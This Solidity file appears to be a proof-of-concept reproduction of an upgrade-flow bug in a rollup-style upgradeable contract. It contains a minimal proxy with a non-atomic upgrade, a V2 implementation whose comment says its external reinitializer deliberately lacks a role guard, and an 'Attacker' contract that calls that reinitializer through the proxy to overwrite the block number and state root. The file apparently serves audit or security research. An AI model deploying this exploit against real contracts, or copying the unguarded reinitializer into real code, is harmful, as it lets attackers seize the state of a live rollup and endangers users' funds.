// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface ILineaRollupV2Like {
    function initialize(uint256 initialL2BlockNumber) external;
    function initializeV2(uint256 initialL2BlockNumber, bytes32 initialStateRootHash) external;
    function currentL2BlockNumber() external view returns (uint256);
    function stateRootHashes(uint256 blockNumber) external view returns (bytes32);
    function initializedVersion() external view returns (uint8);
}

/// @notice Minimal proxy with explicit non-atomic upgrade flow.
contract LineaF2SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("linea.f2.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("linea.f2.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            admin_ := sload(slot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(slot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice V1 rollup-like storage/state with initializer versioning.
contract LineaRollupV1Like {
    uint8 public initializedVersion;
    uint256 public currentL2BlockNumber;
    mapping(uint256 blockNumber => bytes32 stateRootHash) public stateRootHashes;

    error AlreadyInitialized();

    constructor() {
        _disableInitializers();
    }

    modifier initializer() {
        if (initializedVersion >= 1) revert AlreadyInitialized();
        initializedVersion = 1;
        _;
    }

    modifier reinitializer(uint8 version) {
        if (initializedVersion >= version) revert AlreadyInitialized();
        initializedVersion = version;
        _;
    }

    function _disableInitializers() internal {
        initializedVersion = type(uint8).max;
    }

    function initialize(uint256 initialL2BlockNumber) external initializer {
        currentL2BlockNumber = initialL2BlockNumber;
    }
}

/// @notice Bug-parity V2 implementation:
/// external reinitializer(3) has no role guard.
contract LineaRollupInitV2Like is LineaRollupV1Like {
    function initializeV2(uint256 initialL2BlockNumber, bytes32 initialStateRootHash) external reinitializer(3) {
        currentL2BlockNumber = initialL2BlockNumber;
        stateRootHashes[initialL2BlockNumber] = initialStateRootHash;
    }
}

contract LineaF2InitV2Attacker {
    function seizeMigrationState(address proxy, uint256 blockNumber, bytes32 stateRootHash) external {
        ILineaRollupV2Like(proxy).initializeV2(blockNumber, stateRootHash);
    }
}
